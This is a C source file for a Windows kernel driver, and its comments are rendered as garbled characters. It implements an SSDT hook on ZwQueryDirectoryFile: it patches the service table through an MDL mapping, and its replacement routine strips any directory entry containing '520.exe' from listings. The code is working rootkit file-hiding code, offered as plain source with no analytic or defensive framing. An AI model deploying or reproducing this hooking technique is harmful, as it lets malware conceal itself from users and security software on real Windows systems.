#include "SSDTHook.h"
#include "SSDTFunction.h"


// SSDT Hook
BOOLEAN SSDTHook()
{
	UNICODE_STRING ustrDllFileName;
	ULONG ulSSDTFunctionIndex = 0;
	PMDL pMdl = NULL;
	PVOID pNewAddress = NULL;
	ULONG ulNewFuncAddr = 0;

	RtlInitUnicodeString(&ustrDllFileName, L"\\??\\C:\\Windows\\System32\\ntdll.dll");
	// �� ntdll.dll �л�ȡ SSDT ����������
	ulSSDTFunctionIndex = GetSSDTFunctionIndex(ustrDllFileName, "ZwQueryDirectoryFile");
	// ����������, ��SSDT���л�ȡ��Ӧ������ַ
	g_pOldSSDTFunctionAddress = (PVOID)KeServiceDescriptorTable.ServiceTableBase[ulSSDTFunctionIndex];
	if (NULL == g_pOldSSDTFunctionAddress)
	{
		DbgPrint("Get SSDT Function Error!\n");
		return FALSE;
	}
	// ʹ�� MDL ��ʽ�޸� SSDT
	pMdl = MmCreateMdl(NULL, &KeServiceDescriptorTable.ServiceTableBase[ulSSDTFunctionIndex], sizeof(ULONG));
	if (NULL == pMdl)
	{
		DbgPrint("MmCreateMdl Error!\n");
		return FALSE;
	}
	MmBuildMdlForNonPagedPool(pMdl);
	pNewAddress = MmMapLockedPages(pMdl, KernelMode);
	if (NULL == pNewAddress)
	{
		IoFreeMdl(pMdl);
		DbgPrint("MmMapLockedPages Error!\n");
		return FALSE;
	}
	// д���º�����ַ
	ulNewFuncAddr = (ULONG)New_ZwQueryDirectoryFile;
	RtlCopyMemory(pNewAddress, &ulNewFuncAddr, sizeof(ULONG));

	// �ͷ�
	MmUnmapLockedPages(pNewAddress, pMdl);
	IoFreeMdl(pMdl);
	
	return TRUE;
}


// SSDT Unhook
BOOLEAN SSDTUnhook()
{
	UNICODE_STRING ustrDllFileName;
	ULONG ulSSDTFunctionIndex = 0;
	PVOID pSSDTFunctionAddress = NULL;
	PMDL pMdl = NULL;
	PVOID pNewAddress = NULL;
	ULONG ulOldFuncAddr = 0;

	RtlInitUnicodeString(&ustrDllFileName, L"\\??\\C:\\Windows\\System32\\ntdll.dll");
	// �� ntdll.dll �л�ȡ SSDT ����������
	ulSSDTFunctionIndex = GetSSDTFunctionIndex(ustrDllFileName, "ZwQueryDirectoryFile");
	// ʹ�� MDL ��ʽ�޸� SSDT
	pMdl = MmCreateMdl(NULL, &KeServiceDescriptorTable.ServiceTableBase[ulSSDTFunctionIndex], sizeof(ULONG));
	if (NULL == pMdl)
	{
		DbgPrint("MmCreateMdl Error!\n");
		return FALSE;
	}
	MmBuildMdlForNonPagedPool(pMdl);
	pNewAddress = MmMapLockedPages(pMdl, KernelMode);
	if (NULL == pNewAddress)
	{
		IoFreeMdl(pMdl);
		DbgPrint("MmMapLockedPages Error!\n");
		return FALSE;
	}
	// д��ԭ������ַ
	ulOldFuncAddr = (ULONG)g_pOldSSDTFunctionAddress;
	RtlCopyMemory(pNewAddress, &ulOldFuncAddr, sizeof(ULONG));

	// �ͷ�
	MmUnmapLockedPages(pNewAddress, pMdl);
	IoFreeMdl(pMdl);

	return TRUE;
}


// �º���
NTSTATUS New_ZwQueryDirectoryFile(
	IN HANDLE               FileHandle,
	IN HANDLE               Event OPTIONAL,
	IN PIO_APC_ROUTINE      ApcRoutine OPTIONAL,
	IN PVOID                ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK    IoStatusBlock,
	OUT PVOID               FileInformation,
	IN ULONG                Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN              ReturnSingleEntry,
	IN PUNICODE_STRING      FileMask OPTIONAL,
	IN BOOLEAN              RestartScan
	)
{
	NTSTATUS status = STATUS_SUCCESS;
	typedef NTSTATUS(*typedef_ZwQueryDirectoryFile)(
		IN HANDLE               FileHandle,
		IN HANDLE               Event OPTIONAL,
		IN PIO_APC_ROUTINE      ApcRoutine OPTIONAL,
		IN PVOID                ApcContext OPTIONAL,
		OUT PIO_STATUS_BLOCK    IoStatusBlock,
		OUT PVOID               FileInformation,
		IN ULONG                Length,
		IN FILE_INFORMATION_CLASS FileInformationClass,
		IN BOOLEAN              ReturnSingleEntry,
		IN PUNICODE_STRING      FileMask OPTIONAL,
		IN BOOLEAN              RestartScan
		);
	// ִ��ԭ����
	status = ((typedef_ZwQueryDirectoryFile)g_pOldSSDTFunctionAddress)(FileHandle,
												Event,
												ApcRoutine,
												ApcContext,
												IoStatusBlock,
												FileInformation,
												Length,
												FileInformationClass,
												ReturnSingleEntry,
												FileMask,
												RestartScan);

	//�����ж������Ƿ�ִ�гɹ������һ�ȡ���Ƿ����ļ���Ŀ¼
	if (NT_SUCCESS(status) && (
		FileInformationClass == FileDirectoryInformation ||
		FileInformationClass == FileFullDirectoryInformation ||
		FileInformationClass == FileIdFullDirectoryInformation ||
		FileInformationClass == FileBothDirectoryInformation ||
		FileInformationClass == FileIdBothDirectoryInformation ||
		FileInformationClass == FileNamesInformation
		))
	{
		PVOID pCurrent = FileInformation;
		PVOID pPre = NULL;
		ULONG ulNextOffset = 0;
		ULONG ulBufferSize = 1024;
		PWCHAR pwszFileName = ExAllocatePool(NonPagedPool, ulBufferSize);
		if (NULL == pwszFileName)
		{
			return status;
		}

		do
		{
			// ��ȡ��һ���ļ���Ϣ��ƫ��
			ulNextOffset = GetNextEntryOffset(pCurrent, FileInformationClass);
			// ��ȡ��ǰ�ڵ���ļ�����
			RtlZeroMemory(pwszFileName, ulBufferSize);
			GetEntryFileName(pCurrent, FileInformationClass, pwszFileName, ulBufferSize);
			DbgPrint("[%S]\n", pwszFileName);
			// ����ָ�������Ƶ��ļ�����Ŀ¼
			if (NULL != wcsstr(pwszFileName, L"520.exe"))
			{
				DbgPrint("Have Hide File Or Directory![%S]\n", pwszFileName);

				// ��������һ���ļ���Ϣ
				if (0 == ulNextOffset)
				{
					// �ж��Ƿ�Ϊ��һ���ļ�
					if (NULL == pPre)
					{
						status = STATUS_NO_MORE_FILES;
					}
					else
					{
						// ����һ���ļ���Ϣ����һ�ļ���Ϣƫ�ƴ�С��Ϊ 0
						SetNextEntryOffset(pPre, FileInformationClass, 0);
					}
					break;
				}
				else
				{
					// ��ʣ�µ��ļ���Ϣ���ǵ���ǰ�ļ���Ϣ��
					ULONG ulCurrentOffset = (ULONG)((PUCHAR)pCurrent - (PUCHAR)FileInformation);
					ULONG ulLeftInfoData = (ULONG)Length - (ulCurrentOffset + ulNextOffset);
					RtlCopyMemory(pCurrent, (PVOID)((PUCHAR)pCurrent + ulNextOffset), ulLeftInfoData);

					continue;
				}
			}
			// ��������
			pPre = pCurrent;
			pCurrent = ((PUCHAR)pCurrent + ulNextOffset);
		} while (0 != ulNextOffset);

		// �ͷ�
		if (pwszFileName)
		{
			ExFreePool(pwszFileName);
			pwszFileName = NULL;
		}
	}

	return status;
}


// �Ӹ����ļ���Ϣ�����л�ȡ�ļ�����
VOID GetEntryFileName(IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo, PWCHAR pwszFileName, ULONG ulBufferSize)
{
	PWCHAR result = NULL;
	ULONG ulLength = 0;
	
	switch (FileInfo)
	{
	case FileDirectoryInformation:
		result = (PWCHAR)&((PFILE_DIRECTORY_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_DIRECTORY_INFORMATION)pData)->FileNameLength;
		break;
	case FileFullDirectoryInformation:
		result = (PWCHAR)&((PFILE_FULL_DIR_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_FULL_DIR_INFORMATION)pData)->FileNameLength;
		break;
	case FileIdFullDirectoryInformation:
		result = (PWCHAR)&((PFILE_ID_FULL_DIR_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_ID_FULL_DIR_INFORMATION)pData)->FileNameLength;
		break;
	case FileBothDirectoryInformation:
		result = (PWCHAR)&((PFILE_BOTH_DIR_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_BOTH_DIR_INFORMATION)pData)->FileNameLength;
		break;
	case FileIdBothDirectoryInformation:
		result = (PWCHAR)&((PFILE_ID_BOTH_DIR_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_ID_BOTH_DIR_INFORMATION)pData)->FileNameLength;
		break;
	case FileNamesInformation:
		result = (PWCHAR)&((PFILE_NAMES_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_NAMES_INFORMATION)pData)->FileNameLength;
		break;
	}
	
	RtlZeroMemory(pwszFileName, ulBufferSize);
	RtlCopyMemory(pwszFileName, result, ulLength);
}


// �ڸ����ļ���Ϣ������������һ���ļ���ƫ��
VOID SetNextEntryOffset(IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo, IN ULONG Offset)
{
	switch (FileInfo)
	{
	case FileDirectoryInformation:
		((PFILE_DIRECTORY_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	case FileFullDirectoryInformation:
		((PFILE_FULL_DIR_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	case FileIdFullDirectoryInformation:
		((PFILE_ID_FULL_DIR_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	case FileBothDirectoryInformation:
		((PFILE_BOTH_DIR_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	case FileIdBothDirectoryInformation:
		((PFILE_ID_BOTH_DIR_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	case FileNamesInformation:
		((PFILE_NAMES_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	}
}


// �Ӹ����ļ���Ϣ�����л�ȡ��һ���ļ���ƫ��
ULONG GetNextEntryOffset(IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo)
{
	ULONG result = 0;
	switch (FileInfo){
	case FileDirectoryInformation:
		result = ((PFILE_DIRECTORY_INFORMATION)pData)->NextEntryOffset;
		break;
	case FileFullDirectoryInformation:
		result = ((PFILE_FULL_DIR_INFORMATION)pData)->NextEntryOffset;
		break;
	case FileIdFullDirectoryInformation:
		result = ((PFILE_ID_FULL_DIR_INFORMATION)pData)->NextEntryOffset;
		break;
	case FileBothDirectoryInformation:
		result = ((PFILE_BOTH_DIR_INFORMATION)pData)->NextEntryOffset;
		break;
	case FileIdBothDirectoryInformation:
		result = ((PFILE_ID_BOTH_DIR_INFORMATION)pData)->NextEntryOffset;
		break;
	case FileNamesInformation:
		result = ((PFILE_NAMES_INFORMATION)pData)->NextEntryOffset;
		break;
	}
	return result;
}






